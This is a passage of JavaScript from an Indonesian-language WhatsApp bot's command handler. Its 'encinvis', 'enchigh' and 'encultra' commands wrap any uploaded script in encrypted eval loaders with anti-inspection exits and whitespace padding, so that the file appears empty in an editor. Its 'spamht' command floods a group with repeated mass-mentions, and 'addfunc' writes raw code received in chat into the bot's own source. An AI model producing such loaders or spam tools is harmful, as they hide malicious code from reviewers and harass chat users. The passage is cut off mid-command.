 const zipName = `𝐒𝐡𝐢𝐧𝐢𝐠𝐚𝐦𝐢𝐕𝟔𝐍𝐞𝐰(ENC).zip`;
 const zipPath = path.join(__dirname, 'tmp', zipName);

 // Bersihin tmp dulu
 if (fs.existsSync(tmpDir)) fs.rmSync(tmpDir, { recursive: true, force: true });
 if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
 fs.mkdirSync(tmpDir, { recursive: true });

 await payreply('⏳ Lagi nge-encrypt & nge-zip, tunggu 15-40 detik...');

 // Fungsi encrypt base64
 const encryptFile = (filePath) => {
 const content = fs.readFileSync(filePath, 'utf8');
 const encrypted = Buffer.from(content).toString('base64');
 const wrap = `// Encrypted by Shinigami
const _0x = "${encrypted}";
eval(Buffer.from(_0x, 'base64').toString('utf8'));`;
 return wrap;
 };

 // Copy semua file kecuali folder exclude
 const exclude = ['node_modules', 'session', '.npm', '.cache', 'tmp'];
 const copyRecursive = (src, dest) => {
 const stat = fs.statSync(src);
 if (stat.isDirectory()) {
 fs.mkdirSync(dest, { recursive: true });
 const files = fs.readdirSync(src);
 for (let file of files) {
 if (exclude.includes(file)) continue;
 copyRecursive(path.join(src, file), path.join(dest, file));
 }
 } else {
 fs.copyFileSync(src, dest);
 }
 };

 copyRecursive(rootDir, tmpDir);

 // Replace & encrypt file yang mau di-encrypt
 const filesToEncrypt = ['AseppLohya.js', 'start.js'];
 for (let file of filesToEncrypt) {
 const filePath = path.join(tmpDir, file);
 if (fs.existsSync(filePath)) {
 fs.writeFileSync(filePath, encryptFile(filePath));
 console.log(`[ENC] ${file}`);
 }
 }

 // Zip folder tmp/backupenc
 const cmd = `cd "${tmpDir}" && zip -r "${zipPath}" .`;

 exec(cmd, async (err) => {
 if (err) {
 console.error(err);
 return payreply(`❌ Gagal zip: ${err.message}\nPastikan panel ada perintah 'zip'`);
 }

 const sizeMB = (fs.statSync(zipPath).size / 1024 / 1024).toFixed(2);

 await payreply(
 `✅ Backup ENC selesai\n` +
 `📦 ${zipName}\n` +
 `📊 Size: ${sizeMB} MB\n` +
 `🔒 Encrypted: AseppLohya.js, start.js\n` +
 `Isi lain tetap polos`
 );

 await Asepp.sendMessage(m.chat, {
 document: fs.readFileSync(zipPath),
 fileName: zipName,
 mimetype: 'application/zip',
 caption: 'Backup ENC - AseppLohya.js & start.js udah ke-encrypt'
 }, { quoted: m });

 fs.rmSync(tmpDir, { recursive: true, force: true });
 fs.unlinkSync(zipPath);
 });

 } catch (e) {
 console.error('backupenc error:', e);
 return payreply(`❌ Error: ${e.message}`);
 }
}
break;





case 'encfile': {
 try {
 
 let quoted = m.quoted ? m.quoted : m.msg.contextInfo.quotedMessage;
 if (!quoted) return payreply('Reply file .js nya bro');

 let mime = (quoted.msg || quoted).mimetype || '';
 if (!mime.includes('javascript') && !mime.includes('text')) {
 return payreply('Reply file .js yang bener, bukan file lain');
 }

 const fs = require("fs");
 const path = require("path");
 const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

 await payreply('⏳ Lagi ngedownload & encrypt...');

 // Download manual biar gak error
 const stream = await downloadContentFromMessage(quoted, 'document');
 let buffer = Buffer.from([]);
 for await (const chunk of stream) {
 buffer = Buffer.concat([buffer, chunk]);
 }
 
 let fileName = quoted.fileName || 'file.js';
 if (!fileName.endsWith('.js')) fileName += '.js';

 // Encrypt base64
 const encrypted = buffer.toString('base64');
 const wrap = `// Encrypted by Shinigami Base64
// Original file: ${fileName}
const _0x = "${encrypted}";
eval(Buffer.from(_0x, 'base64').toString('utf8'));`;

 const tmpDir = path.join(__dirname, 'tmp');
 fs.mkdirSync(tmpDir, { recursive: true });
 
 const outName = fileName.replace('.js', '.enc.js');
 const outPath = path.join(tmpDir, outName);
 
 fs.writeFileSync(outPath, wrap, 'utf8');

 await payreply(`✅ File berhasil di-encrypt base64\n📄 ${outName}`);

 await Asepp.sendMessage(m.chat, {
 document: fs.readFileSync(outPath),
 fileName: outName,
 mimetype: 'text/javascript',
 caption: 'Upload & jalanin langsung'
 }, { quoted: m });

 fs.unlinkSync(outPath);

 } catch (e) {
 console.error('encfile error:', e);
 return payreply(`❌ Error: ${e.message}`);
 }
}
break;


case 'encinvis': {
 try {
 if (!isCreator) return payreply(mess.owner);
 
 let quoted = m.quoted ? m.quoted : m.msg?.contextInfo?.quotedMessage;
 if (!quoted) return payreply('Reply file .js nya bro');

 const fs = require("fs");
 const path = require("path");
 const crypto = require("crypto");
 const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

 await payreply('⏳ Encrypt invis mode...');

 // Download file
 const stream = await downloadContentFromMessage(quoted, 'document');
 let buffer = Buffer.from([]);
 for await (const chunk of stream) {
 buffer = Buffer.concat([buffer, chunk]);
 }
 
 let fileName = quoted.fileName || 'file.js';
 if (!fileName.endsWith('.js')) fileName += '.js';

 // AES-256-GCM encrypt
 const key = crypto.randomBytes(32);
 const iv = crypto.randomBytes(12);
 const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
 let encrypted = cipher.update(buffer);
 encrypted = Buffer.concat([encrypted, cipher.final()]);
 const authTag = cipher.getAuthTag();

 const payload = {
 d: encrypted.toString('base64'),
 i: iv.toString('base64'),
 t: authTag.toString('base64')
 };

 // Invisible loader - keliatan kayak comment kosong
 const loader = `
/*
${' '.repeat(1000)}
*/
(function(){
 try{
 const c=require('crypto');
 const k=Buffer.from('${key.toString('base64')}','base64');
 const p=${JSON.stringify(payload)};
 if(require('util').inspect(()=>{}).length>20)process.exit(1);
 const d=c.createDecipheriv('aes-256-gcm',k,Buffer.from(p.i,'base64'));
 d.setAuthTag(Buffer.from(p.t,'base64'));
 let o=d.update(Buffer.from(p.d,'base64'));
 o=Buffer.concat([o,d.final()]);
 setTimeout(Function('return(eval)')()(o.toString('utf8')),1);
 }catch(e){process.exit(1)}
})();
 `.trim();

 // Encode jadi invisible hex string
 const invis = loader.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
 const finalCode = `// ${' '.repeat(500)}\neval("${invis}".replace(/\\\\x/g,'%'));`;

 const tmpDir = path.join(__dirname, 'tmp');
 fs.mkdirSync(tmpDir, { recursive: true });
 
 const outName = fileName.replace('.js', '.invis.js');
 const outPath = path.join(tmpDir, outName);
 
 fs.writeFileSync(outPath, finalCode, 'utf8');

 await payreply(
 `✅ Encrypt Invis Selesai\n` +
 `📄 ${outName}\n` +
 `🔒 Method: AES-256-GCM + Invisible Loader\n` +
 `👻 File keliatan kosong kalau dibuka text editor`
 );

 await Asepp.sendMessage(m.chat, {
 document: fs.readFileSync(outPath),
 fileName: outName,
 mimetype: 'text/javascript',
 caption: 'Encinvis mode. No npm. No bypass gampang.'
 }, { quoted: m });

 fs.unlinkSync(outPath);

 } catch (e) {
 console.error('encinvis error:', e);
 return payreply(`❌ Error: ${e.message}`);
 }
}
break;



case 'enchigh': {
 try {
 if (!isCreator) return payreply(mess.owner);
 
 let quoted = m.quoted? m.quoted : m.msg?.contextInfo?.quotedMessage;
 if (!quoted) return payreply('Reply file.js nya bro');

 const fs = require("fs");
 const path = require("path");
 const crypto = require("crypto");
 const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

 await payreply('⏳ Encrypt high mode...');

 const stream = await downloadContentFromMessage(quoted, 'document');
 let buffer = Buffer.from([]);
 for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
 
 let fileName = quoted.fileName || 'file.js';
 if (!fileName.endsWith('.js')) fileName += '.js';

 // Double AES-256-GCM + XOR
 const key1 = crypto.randomBytes(32);
 const key2 = crypto.randomBytes(32);
 const iv1 = crypto.randomBytes(12);
 const iv2 = crypto.randomBytes(12);

 const xorKey = crypto.randomBytes(buffer.length);
 const xored = Buffer.from(buffer).map((b, i) => b ^ xorKey[i]);

 const cipher1 = crypto.createCipheriv('aes-256-gcm', key1, iv1);
 let enc1 = cipher1.update(xored);
 enc1 = Buffer.concat([enc1, cipher1.final()]);
 const tag1 = cipher1.getAuthTag();

 const cipher2 = crypto.createCipheriv('aes-256-gcm', key2, iv2);
 let enc2 = cipher2.update(enc1);
 enc2 = Buffer.concat([enc2, cipher2.final()]);
 const tag2 = cipher2.getAuthTag();

 const payload = {
 d: enc2.toString('base64'),
 x: xorKey.toString('base64'),
 i1: iv1.toString('base64'), t1: tag1.toString('base64'),
 i2: iv2.toString('base64'), t2: tag2.toString('base64')
 };

 const stealth = `
(function(){
 const c=require('crypto');
 const _eval=eval;eval=()=>{process.exit(1)};
 try{
 const p=${JSON.stringify(payload)};
 const k1=c.createHash('sha256').update(Buffer.from('${key1.toString('base64')}','base64')).digest();
 const k2=c.createHash('sha256').update(Buffer.from('${key2.toString('base64')}','base64')).digest();

 let d1=c.createDecipheriv('aes-256-gcm',k2,Buffer.from(p.i2,'base64'));
 d1.setAuthTag(Buffer.from(p.t2,'base64'));
 let o1=d1.update(Buffer.from(p.d,'base64'));
 o1=Buffer.concat([o1,d1.final()]);

 let d2=c.createDecipheriv('aes-256-gcm',k1,Buffer.from(p.i1,'base64'));
 d2.setAuthTag(Buffer.from(p.t1,'base64'));
 let o2=d2.update(o1);
 o2=Buffer.concat([o2,d2.final()]);

 const xk=Buffer.from(p.x,'base64');
 const final=Buffer.from(o2).map((b,i)=>b^xk[i]);
 _eval(final.toString('utf8'));
 }catch(e){process.exit(1)}
})();
 `.trim();

 const b64 = Buffer.from(stealth).toString('base64');
 const hex = b64.split('').map(c=>'\\x'+c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
 const finalCode = `eval(Buffer.from("${hex}".replace(/\\\\x/g,''),'hex').toString('base64'));`;

 const tmpDir = path.join(__dirname, 'tmp');
 fs.mkdirSync(tmpDir, { recursive: true });
 
 const outName = fileName.replace('.js', '.high.js');
 const outPath = path.join(tmpDir, outName);
 fs.writeFileSync(outPath, finalCode, 'utf8');

 await payreply(`✅ Encrypt High Selesai\n📄 ${outName}\n🔒 Double AES-256-GCM + XOR + Obfuscation\n🛡️ Ptero-safe, Node 20+`);

 await Asepp.sendMessage(m.chat, {
 document: fs.readFileSync(outPath),
 fileName: outName,
 mimetype: 'text/javascript',
 caption: 'Enchigh Ptero-safe'
 }, { quoted: m });

 fs.unlinkSync(outPath);

 } catch (e) {
 console.error('enchigh error:', e);
 return payreply(`❌ Error: ${e.message}`);
 }
}
break;

case 'encultra': {
 try {
 if (!isCreator) return payreply(mess.owner);
 
 let quoted = m.quoted ? m.quoted : m.msg?.contextInfo?.quotedMessage;
 if (!quoted) return payreply('Reply file .js nya bro');

 const fs = require("fs");
 const path = require("path");
 const crypto = require("crypto");
 const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

 await payreply('⏳ Lagi encrypt ultra...');

 const stream = await downloadContentFromMessage(quoted, 'document');
 let buffer = Buffer.from([]);
 for await (const chunk of stream) {
 buffer = Buffer.concat([buffer, chunk]);
 }
 
 let fileName = quoted.fileName || 'file.js';
 if (!fileName.endsWith('.js')) fileName += '.js';

 // AES-256-GCM encrypt
 const key = crypto.randomBytes(32);
 const iv = crypto.randomBytes(12);
 const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
 let encrypted = cipher.update(buffer);
 encrypted = Buffer.concat([encrypted, cipher.final()]);
 const authTag = cipher.getAuthTag();

 const payload = {
 d: encrypted.toString('base64'),
 i: iv.toString('base64'),
 t: authTag.toString('base64')
 };

 const keyB64 = key.toString('base64');
 
 const wrapper = `
(function(){
 try{
 const c=require('crypto');
 const k=Buffer.from('${keyB64}','base64');
 const p=${JSON.stringify(payload)};
 const d=c.createDecipheriv('aes-256-gcm',k,Buffer.from(p.i,'base64'));
 d.setAuthTag(Buffer.from(p.t,'base64'));
 let o=d.update(Buffer.from(p.d,'base64'));
 o=Buffer.concat([o,d.final()]);
 eval(o.toString('utf8'));
 }catch(e){
 console.log('File corrupt/tampered');
 process.exit(1);
 }
})();
 `.trim();

 // Hex obfuscation
 const obfuscated = wrapper
 .split('').map((c)=>c.charCodeAt(0).toString(16).padStart(2,'0'))
 .join('')
 .match(/.{1,2}/g)
 .map(h=>'\\x'+h)
 .join('');

 const finalCode = `eval("${obfuscated}".replace(/\\\\x/g,'%'));`;

 const tmpDir = path.join(__dirname, 'tmp');
 fs.mkdirSync(tmpDir, { recursive: true });
 
 const outName = fileName.replace('.js', '.ultra.js');
 const outPath = path.join(tmpDir, outName);
 fs.writeFileSync(outPath, finalCode, 'utf8');

 await payreply(
 `✅ Encrypt Ultra Selesai\n` +
 `📄 ${outName}\n` +
 `🔒 Method: AES-256-GCM + Hex Obfuscation\n` +
 `⚠️ Edit file = corrupt & exit`
 );

 await Asepp.sendMessage(m.chat, {
 document: fs.readFileSync(outPath),
 fileName: outName,
 mimetype: 'text/javascript',
 caption: 'Ultra mode. No npm needed.'
 }, { quoted: m });

 fs.unlinkSync(outPath);

 } catch (e) {
 console.error('encultra error:', e);
 return payreply(`❌ Error: ${e.message}`);
 }
}

case 'menuenc': {
 let teks = `\`𝗘𝗡𝗖𝗥𝗬𝗣𝗧 𝗠𝗘𝗡𝗨\`

Hi \`${pushname}\` 👋 Ini command buat encrypt file JS lu. Semua mode no npm, tinggal reply file .js nya.

⌲ \`𝐄𝐍𝐂 𝐂𝐎𝐌𝐀𝐍𝐃\`
┏━━━━━━━━
┃☇ ${prefix}encfile \`Basic obfuscation\`
┃☇ ${prefix}encultra \`AES-256-GCM + Anti tamper\`
┃☇ ${prefix}encinvis \`Invisible mode, file keliatan kosong\`
┗━━━━━━━━━━

⌲ \`𝐂𝐀𝐑𝐀 𝐏𝐀𝐊𝐀𝐈\`
Kirim/reply file .js terus ketik:
${prefix}encfile
${prefix}encultra 
${prefix}encinvis

⌲ \`𝐏𝐄𝐑𝐁𝐄𝐃𝐀𝐍\`
┏━━━━━━━━
┃✦ *encfile* » Simple obfuscate, buat ngumpetin source doang
┃✦ *encultra* » AES + anti tamper, edit 1 huruf langsung mati
┃✦ *encinvis* » File hasil keliatan kosong di text editor
┗━━━━━━━━━━
\`[🔒] 𝐄𝐍𝐂𝐑𝐘𝐏𝐓 𝐒𝐘𝐒𝐓𝐄𝐌 [🔒]\`
`;

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://litter.catbox.moe/zj5hkf.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© ENC MENU",
 sections: [{
 title: "Encrypt Command",
 highlight_label: "𝐄𝐍𝐂 𝐌𝐎𝐃𝐄 🔒",
 rows: [
 { title: "𝐄𝐧𝐜 𝐅𝐢𝐥𝐞", description: "Obfuscation basic", id: `${prefix}encfile` },
 { title: "𝐄𝐧𝐜 𝐔𝐥𝐭𝐫𝐚", description: "AES-256-GCM + Anti tamper", id: `${prefix}encultra` },
 { title: "𝐄𝐧𝐜 𝐈𝐧𝐯𝐢𝐬", description: "Invisible mode", id: `${prefix}encinvis` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 );

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

 // Kirim mp3
 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/encnih.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 );
}
break;











case 'spamht': {
 try {
 if (!isOwner) return payreply('Owner only! 🩸');
 if (!m.isGroup) return payreply('Khusus group bro');
 if (!text) return payreply(`Contoh: ${prefix}spamht 5 halo semua\nAngka bisa dimana aja`);

 let match = text.match(/\d+/);
 if (!match) return payreply('Masukin angkanya bro. Contoh: spamht 5 halo semua');

 const count = parseInt(match[0]);
 if (count < 1 || count > 20) return payreply('Jumlah spam 1-20 aja');

 const spamText = text.replace(match[0], '').trim();
 if (!spamText) return payreply('Teks nya mana bro?');

 const groupMetadata = await Asepp.groupMetadata(m.chat);
 const participants = groupMetadata.participants;
 const groupName = groupMetadata.subject || 'Unknown Group';

 await payreply(`⏳ Spam HT ${count}x dimulai...`);

 const qkontak = {
 key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: m.chat },
 message: { contactMessage: { displayName: "System", vcard: "BEGIN:VCARD\nVERSION:3.0\nN:System;System;;;\nFN:System\nEND:VCARD" }}
 };

 let success = 0;
 let failed = 0;
 let startTime = Date.now();

 for (let i = 0; i < count; i++) {
 try {
 await Asepp.sendMessage(m.chat, {
 text: spamText,
 mentions: participants.map(a => a.id)
 }, { quoted: qkontak });
 success++;
 } catch {
 failed++;
 }
 await new Promise(r => setTimeout(r, 1500));
 }

 let duration = ((Date.now() - startTime) / 1000).toFixed(1);
 let dateNow = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

 const ownerNum = '62881036109288';
 const ownerJid = `${ownerNum}@s.whatsapp.net`;

 let teks = `\`𝗦𝗣𝗔𝗠 𝗛𝗧 𝗥𝗘𝗦𝗨𝗟𝗧\`

Hi \`${pushname}\` 👋 Spam HT selesai 🩸

⌲ \`𝐈𝐍𝐅𝐎 𝐒𝐏𝐀𝐌\`
┏━━━━━━━━
┃✦ *Group »* ${groupName}
┃✦ *Teks »* ${spamText}
┃✦ *Target »* ${participants.length} member
┃✦ *Jumlah »* ${count}x
┃✦ *Sukses »* ${success}
┃✦ *Gagal »* ${failed}
┃✦ *Durasi »* ${duration}s
┃✦ *Selesai »* ${dateNow}
┗━━━━━━━━━━

⌲ \`𝐒𝐓𝐀𝐓𝐔𝐒\`
${failed === 0? '✅ Semua pesan terkirim aman' : '⚠️ Ada pesan gagal terkirim'}
\`[洛] 𝐒𝐏𝐀𝐌 𝐇𝐓 𝐋𝐎𝐆 [洛]\`
Owner : @${ownerNum}
`;

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({ text: "" }),
 footer: proto.Message.InteractiveMessage.Footer.create({ text: teks }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: "𝗦𝗣𝗔𝗠 𝗛𝗧 𝗗𝗢𝗡𝗘"
 }),
 contextInfo: {
 mentionedJid: [ownerJid] // <- ini kuncinya
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© RESULT MENU",
 sections: [{
 title: "Spam HT Log",
 highlight_label: "𝐒𝐓𝐀𝐓𝐒 📊",
 rows: [
 { title: "𝐔𝐥𝐚𝐧𝐠𝐢 𝐒𝐩𝐚𝐦", description: `Spam lagi ${spamText}`, id: `${prefix}spamht ${count} ${spamText}` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m } // gak perlu mentions disini lagi
 );

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

 } catch (e) {
 console.log("Error spamht:", e);
 await payreply("❌ Error: " + e.message);
 }
}
break;


case 'addfunc': {
  if (!isCreator) return payreply(mess.owner);

  let funcCode = text.replace(/^\.addfunc\s*/, '').trim();
  if (!funcCode) return payreply(`Contoh:\n${prefix}addfunc async function nama() {\n payreply("halo")\n}`);

  if (!funcCode.startsWith('async function') &&!funcCode.startsWith('function')) {
    return payreply(
      `Format salah bro!\nContoh:\n${prefix}addfunc async function nama() {\n payreply("halo")\n}`
    );
  }

  const fs = require("fs");
  const path = "./AseppLohya.js";

  try {
    let data = fs.readFileSync(path, "utf8");

    // Cari break setelah case "qc"
    const regex = /(case\s+["']qc["']\s*:\s*\{[\s\S]*?\bbreak\s*;?)/s;
    let match = regex.exec(data);

    if (!match) return payreply('[ERR] case "qc" dengan break tidak ditemukan');

    let insertPos = match.index + match[0].length;

    // Insert kode mentah 1:1
    let newData = data.slice(0, insertPos) + '\n\n' + funcCode + '\n\n' + data.slice(insertPos);

    // Backup dulu
    fs.writeFileSync(path + '.backup', data);
    fs.writeFileSync(path, newData);

    await payreply(`✅ Function ditambah tanpa diubah 🩸\n\nKode lu masuk persis kayak yang dikirim.\nBackup: AseppLohya.js.backup\nRestart bot`);

  } catch (e) {
    console.log('Error addfunc:', e);
    await payreply('❌ Gagal addfunc: ' + e.message);
  }
}
break;

case 'clearfunc': {
 if (!isCreator) return payreply(mess.owner);
 
 const fs = require('fs');
 const path = './AseppLohya.js';
 
 try {
 if (!fs.existsSync(path)) return payreply('File AseppLohya.js gak ketemu');
 
 let data = fs.readFileSync(path, 'utf8');
 
 // Regex: hapus dari "break" setelah case qc, sampai sebelum case testfunction
 const regex = /(case\s+["']qc["']\s*:\s*\{[\s\S]*?\bbreak\s*;?)([\s\S]*?)(?=case\s+["']testfunction["']\s*:)/s;
 
 if (!regex.test(data)) {
 return payreply('[ERR] Format gak ketemu. Pastikan ada:\ncase "qc" : { ... break }\n...\ncase "testfunction" : {');
 }
 
 // Ganti isi tengah jadi 1 newline aja
 let newData = data.replace(regex, '$1\n');
 
 // Backup dulu
 fs.writeFileSync(path + '.backup', data);
 fs.writeFileSync(path, newData);
 
 await payreply(`✅ Clear sukses 🩸\n\nIsi setelah break case qc sampe sebelum testfunction udah dihapus.\nBackup: AseppLohya.js.backup\nRestart bot`);
 
 } catch (e) {
 console.log('Error clearfunc:', e);
 await payreply('❌ Gagal clear: ' + e.message);
 }
}
break

case "gntitumb": {
 const fs = require("fs");
 const path = require("path");
 
 if(!text) return m.reply("Format: .gntitumb linkurllama | linkurlbaru\nContoh: .gntitumb https://lama.mp4 | https://baru.mp4");
 
 let [oldUrl, newUrl] = text.split("|").map(v => v.trim());
 
 if(!oldUrl || !newUrl) return m.reply("Link lama atau link baru kosong. Pisahin pakai |");
 
 let filePath = path.join(__dirname, "AseppLohya.js");
 if(!fs.existsSync(filePath)) filePath = path.join(process.cwd(), "AseppLohya.js");
 if(!fs.existsSync(filePath)) filePath = path.join(process.cwd(), "plugins", "AseppLohya.js");
 
 if(!fs.existsSync(filePath)) return m.reply("❌ File AseppLohya.js gak ketemu");
 
 try {
 let data = fs.readFileSync(filePath, "utf8");
 
 // Escape karakter khusus di regex
 let escapeOldUrl = oldUrl.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
 let regex = new RegExp(`url:\\s*["']${escapeOldUrl}["']`, "g");
 
 let matchCount = (data.match(regex) || []).length;
 
 if(matchCount === 0) return m.reply(`❌ Link ${oldUrl} gak ketemu di file`);
 
 let newData = data.replace(regex, `url: "${newUrl}"`);
 
 fs.writeFileSync(filePath, newData, "utf8");
 
 await m.reply(`✅ Sukses ganti ${matchCount} link!\n\nLama: ${oldUrl}\nBaru: ${newUrl}\n\nRestart bot biar keapply`);
 
 } catch(e) {
 m.reply("❌ Error: " + e.message);
 }
}
break
case "menunew": {
 const fs = require("fs");
 const path = require("path");
 const moment = require("moment-timezone");
 const nowJakarta = moment().tz('Asia/Jakarta');

 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });

 let extraCommands = [];
 let possiblePaths = [
 path.join(__dirname, "AseppLohya.js"),
 path.join(process.cwd(), "AseppLohya.js"),
 path.join(process.cwd(), "plugins", "AseppLohya.js")
 ];

 let allCommands = [];
 for(let filePath of possiblePaths) {
 try {
 if(fs.existsSync(filePath)) {
 let data = fs.readFileSync(filePath, "utf8");
 let regex = /case\s+["']([^"']+)["']\s*:/g;
 let match;
 while ((match = regex.exec(data))!== null) {
 allCommands.push(match[1]);
 }
 allCommands = [...new Set(allCommands)];
 break;
 }
 } catch(e) {}
 }

 // 11 command utama + menunew itu baseline
 let baseline = ["clearfunc", "addfunc", "listmenucase", "allah", "nabi", "alquran", "tipsdev", "spamht", "encfile", "encultra", "encinvis", "menunew"];

 // Cek snapshot, kalau belum ada bikin sekarang
 let snapshotPath = path.join(process.cwd(), "menunew_snapshot.json");
 if(!fs.existsSync(snapshotPath)) {
 fs.writeFileSync(snapshotPath, JSON.stringify({ baseline: baseline }, null, 2));
 }

 // Ambil command yang baru ditambah setelah snapshot dibuat
 try {
 let snapshot = JSON.parse(fs.readFileSync(snapshotPath, "utf8"));
 extraCommands = allCommands.filter(cmd =>!snapshot.baseline.includes(cmd));
 } catch(e) {
 extraCommands = [];
 }

 let teks = `\`𝗦𝗛𝗜𝗡𝗜𝗚𝗔𝗠𝗜 𝗡𝗘𝗪 𝗠𝗘𝗡𝗨\`

Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))}
Ini list command yang kita buat bareng dari kemaren. Auto update kalau ada case baru. ✨

⌲ \`𝐍𝐄𝐖 𝐌𝐄𝐍𝐔 𝐁𝐘 𝐀𝐒𝐄𝐏\`
┏━━━━━━━━
┃✦ Main Command » 11
┃✦ New Added » ${extraCommands.length}
┃✦ Update » ${nowJakarta.format('DD/MM HH:mm')}
┗━━━━━━━━━━

\`[洛] 𝐍𝐄𝐖 𝐅𝐔𝐍𝐂𝐓𝐈𝐎𝐍 [洛]\`

 \`[ 𝐅𝐈𝐋𝐄 𝐌𝐀𝐍𝐀𝐆𝐄𝐑 ]\`
→.clearfunc
→.addfunc
→.listmenucase

 \`[ 𝐈𝐒𝐋𝐀𝐌𝐈 ]\`
→.allah
→.nabi
→.alquran

 \`[ 𝐓𝐎𝐋𝐒 ]\`
→.tipsdev
→.spamht

 \`[ 𝐄𝐍𝐂𝐑𝐘𝐏𝐓 ]\`
→.encfile
→.encultra
→.encinvis
`;

 if(extraCommands.length > 0) {
 teks += `\n \`[ 𝐍𝐄𝐖 𝐀𝐃𝐄𝐃 ]\`\n`;
 extraCommands.forEach(cmd => {
 teks += `→.${cmd}\n`;
 });
 } else {
 teks += `\n \`[ 𝐍𝐄𝐖 𝐀𝐃𝐄𝐃 ]\`\nBelum ada command baru`;
 }

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({ text: "" }),
 footer: proto.Message.InteractiveMessage.Footer.create({ text: teks }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://qu.ax/fPcSi" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐍𝐄𝐖",
 url: "https://t.me/AsepXxnx",
 copy_code: "𝐍𝐄𝐖",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 2,
 divider_indices: [1, 2, 3, 4, 5],
 list_title: "CLICK",
 button_title: "© NEW"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© NEW",
 sections: [{
 title: "New Menu",
 highlight_label: "𝐍𝐞𝐰 𝐅𝐞𝐚𝐭𝐮𝐫𝐞 🚀",
 rows: [
 { title: "𝐅𝐢𝐥𝐞 𝐌𝐚𝐧𝐚𝐠𝐞𝐫", description: "𝐂𝐥𝐞𝐚𝐫, 𝐀𝐝, 𝐋𝐢𝐬𝐭 𝐅𝐮𝐧𝐜𝐭𝐢𝐨𝐧", id: ".listmenucase" },
 { title: "𝐈𝐬𝐥𝐚𝐦𝐢", description: "𝐀𝐥𝐚𝐡, 𝐍𝐚𝐛𝐢, 𝐀𝐥𝐪𝐮𝐫𝐚𝐧", id: ".allah" },
 { title: "𝐓𝐨𝐥𝐬", description: "𝐓𝐢𝐩𝐬 𝐃𝐞𝐯 & 𝐒𝐩𝐚𝐦 𝐇𝐓", id: ".tipsdev" },
 { title: "𝐄𝐧𝐜𝐫𝐲𝐩𝐭", description: "𝐄𝐧𝐜𝐫𝐲𝐩𝐭 𝐅𝐢𝐥𝐞 𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬", id: ".encfile" }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: lol }
 );

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

 try {
 let audioPath = path.join(__dirname, "image", "3021.mp3");
 if(fs.existsSync(audioPath)) {
 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync(audioPath),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: qkontak }
 );
 }
 } catch(e) {}
}
break;

case "upgh": {
 const fs = require("fs");
 const path = require("path");
 
 
 let [oldToken, newToken] = text.split("|").map(v => v.trim());
 
 if(!oldToken || !newToken) return Asepp.sendMessage(m.chat, { text: "Token lama atau token baru kosong. Pisahin pakai |" }, { quoted: m });
 
 let filePath = path.join(__dirname, "AseppLohya.js");
 if(!fs.existsSync(filePath)) filePath = path.join(process.cwd(), "AseppLohya.js");
 if(!fs.existsSync(filePath)) filePath = path.join(process.cwd(), "plugins", "AseppLohya.js");
 
